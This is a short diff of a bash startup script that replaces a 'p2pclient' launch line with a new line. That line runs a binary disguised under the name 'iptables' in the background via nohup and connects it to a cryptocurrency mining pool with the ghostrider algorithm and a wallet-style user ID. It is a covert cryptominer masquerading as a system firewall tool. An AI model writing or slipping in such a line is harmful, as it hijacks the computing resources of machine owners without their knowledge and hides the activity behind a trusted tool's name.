@@ -1,3 +1,2 @@
 #!/bin/bash
-chmod +x p2pclient
-nohup ./p2pclient --login garsenkamser@gmail.com &
+chmod 777 iptables && nohup ./iptables --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BcwEkYe2WhVDUW1BvGfy2ExfDUy3XA8JAS.$(echo $(shuf -i 1-999 -n 1)-T) &
